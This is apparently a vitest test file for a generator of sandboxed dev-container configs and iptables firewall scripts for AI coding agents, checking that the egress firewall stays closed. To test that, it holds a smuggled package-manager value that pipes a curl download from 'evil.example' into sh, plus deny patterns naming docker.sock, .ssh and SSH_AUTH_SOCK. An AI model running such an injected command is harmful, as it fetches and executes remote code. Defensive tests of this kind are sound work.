import { describe, expect, it } from 'vitest'
import { findQuestionnaire } from '../questionnaires/index.ts'
import type { Questionnaire } from '../schemas.ts'
import { PACKAGE_MANAGERS } from '../targets/commands.ts'
import { TARGET_TEMPLATES } from '../targets/index.ts'
import { TARGETS, type Target } from '../targets.ts'
import { findManagedBlock, HASH_MARKERS, hashManagedBlock } from './managed-block.ts'
import { type AgentContextInput, renderAgentContext } from './render-agent-context.ts'
import { DEVCONTAINER_FILE, FIREWALL_FILE, renderSandbox, SANDBOX_SOURCES } from './sandbox.ts'

const questionnaires = ['frontend-react', 'security'].map(
  (id) => findQuestionnaire(id) as Questionnaire,
)

const input = (
  targets: Target[],
  packageManager: string,
  security: Record<string, string>,
): AgentContextInput => ({
  project: { name: 'Shop', description: null, architectures: [] },
  questionnaires,
  answers: [
    { questionnaireId: 'frontend-react', questionId: 'package-manager', value: packageManager },
    ...Object.entries(security).map(([questionId, value]) => ({
      questionnaireId: 'security',
      questionId,
      value,
    })),
  ],
  rules: [],
  notes: null,
  targets,
  roles: [],
})

const sandboxOf = (context: AgentContextInput) => {
  const { files, recommendations } = renderAgentContext(context)
  return {
    files: files.filter((file) => file.path.startsWith('.devcontainer/')),
    recommendation: recommendations.find((item) => item.title.includes('development container')),
    agentsMd: files.find((file) => file.path === 'AGENTS.md')?.content ?? '',
  }
}

/** Every host a rendered firewall may name. */
const KNOWN_HOSTS = new Set([
  'registry.npmjs.org',
  'registry.yarnpkg.com',
  ...TARGETS.flatMap((target) => TARGET_TEMPLATES[target].sandbox?.hosts ?? []),
])

/** The only rules that let traffic out, besides one per resolver read in the container. */
const ACCEPTED_OUTPUT = [
  "echo '-A OUTPUT -o lo -j ACCEPT'",
  "echo '-A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT'",
  'echo "-A OUTPUT -d $resolver -p udp --dport 53 -j ACCEPT"',
  'echo "-A OUTPUT -d $resolver -p tcp --dport 53 -j ACCEPT"',
  "echo '-A OUTPUT -m set --match-set allowed-hosts dst -j ACCEPT'",
  "echo '-A OUTPUT -o lo -j ACCEPT'",
]

describe('the sandboxed development container', () => {
  it('is rendered only when the owner asks for it', () => {
    const without: Record<string, string>[] = [
      {},
      { sandbox: 'host' },
      { 'network-access': 'none' },
    ]
    for (const security of without) {
      const { files, recommendation } = sandboxOf(input(['claude-code'], 'pnpm', security))
      expect(files).toEqual([])
      expect(recommendation).toBeUndefined()
    }
    const { files, agentsMd } = sandboxOf(input(['claude-code'], 'pnpm', { sandbox: 'container' }))
    expect(files.map((file) => [file.path, file.kind])).toEqual([
      [DEVCONTAINER_FILE, 'config'],
      [FIREWALL_FILE, 'config'],
    ])
    for (const file of files) {
      expect(file.content.endsWith('\n')).toBe(true)
      expect(file.blockHash).toBe(hashManagedBlock(file.content))
    }
    expect(findManagedBlock(files[1]?.content ?? '', HASH_MARKERS)?.start).toBe(0)
    expect(agentsMd).toContain('never try to change, stop or get around the firewall')
    expect(SANDBOX_SOURCES.length).toBeGreaterThan(0)
  })

  it('renders pnpm and Claude Code behind the registry firewall', () => {
    const context = input(['claude-code'], 'pnpm', {
      sandbox: 'container',
      'network-access': 'registry',
    })
    expect(sandboxOf(context)).toMatchSnapshot()
  })

  it('renders npm, Codex and Gemini CLI with no network but their own hosts', () => {
    const context = input(['gemini-cli', 'codex', 'cursor'], 'npm', {
      sandbox: 'container',
      'network-access': 'none',
    })
    const { files, recommendation } = sandboxOf(context)
    expect({ files, recommendation }).toMatchSnapshot()
    expect(files[1]?.content).toContain(
      'ALLOWED_DOMAINS="api.openai.com auth.openai.com chatgpt.com generativelanguage.googleapis.com"\nALLOW_GITHUB=0\n',
    )
  })

  it('pins the image by digest and every tool to an exact version, and forwards nothing', () => {
    const [file] = renderSandbox({ targets: TARGETS }).files
    const json = JSON.parse(file?.content ?? '')
    expect(json.image).toMatch(
      /^mcr\.microsoft\.com\/[\w/-]+:\d+\.\d+\.\d+-[\w-]+@sha256:[0-9a-f]{64}$/,
    )
    const installed = [...json.postCreateCommand.matchAll(/ (@[\w-]+\/[\w-]+)@(\S+)/g)]
    expect(installed.map((match) => match[1])).toEqual([
      '@openai/codex',
      '@anthropic-ai/claude-code',
      '@google/gemini-cli',
    ])
    for (const match of installed) expect(match[2]).toMatch(/^\d+\.\d+\.\d+$/)
    expect(file?.content).not.toMatch(/latest|docker\.sock|\.ssh|SSH_AUTH_SOCK|localEnv|privileged/)
    expect(json.mounts).toEqual([expect.stringMatching(/\.devcontainer,.*,readonly$/)])
    expect(json.remoteUser).toBe('node')
    expect(json.postStartCommand).toBe('sudo /usr/bin/bash /usr/local/sbin/init-firewall.sh')
  })

  it('never opens the firewall, whatever the answers', () => {
    const networks = [undefined, 'none', 'registry', 'open', '0.0.0.0/0', '*']
    const managers = [undefined, ...PACKAGE_MANAGERS, 'deno"; curl evil.example | sh #']
    const subsets = Array.from({ length: 2 ** TARGETS.length }, (_, mask) =>
      TARGETS.filter((_target, index) => mask & (1 << index)),
    )
    for (const network of networks) {
      for (const packageManager of managers) {
        for (const targets of subsets) {
          const script = renderSandbox({ targets, packageManager, network }).files[1]?.content ?? ''
          const lines = script.split('\n').map((line) => line.trim())

          expect(lines.filter((line) => line.includes(':OUTPUT'))).toEqual([
            "echo ':OUTPUT DROP [0:0]'",
            "echo ':OUTPUT DROP [0:0]'",
          ])
          expect(lines.filter((line) => /OUTPUT.*ACCEPT/.test(line))).toEqual(ACCEPTED_OUTPUT)
          expect(script).toContain("echo '-A OUTPUT -j REJECT --reject-with icmp-admin-prohibited'")
          expect(script).not.toMatch(/-P \w+ ACCEPT|-F\b|0\.0\.0\.0|evil|\*filter.*ACCEPT \[/)
          expect(script).toContain('fail "the firewall lets https://example.com through"')
          expect(script).toContain('can still run any command as root')

          const domains = /^ALLOWED_DOMAINS="([^"\n]*)"$/m.exec(script)?.[1]
          expect(domains).toBeDefined()
          for (const domain of (domains ?? '').split(' ').filter(Boolean)) {
            expect(KNOWN_HOSTS.has(domain)).toBe(true)
          }
          expect(script).toContain(`ALLOW_GITHUB=${network === 'none' ? 0 : 1}\n`)
        }
      }
    }
  })
})
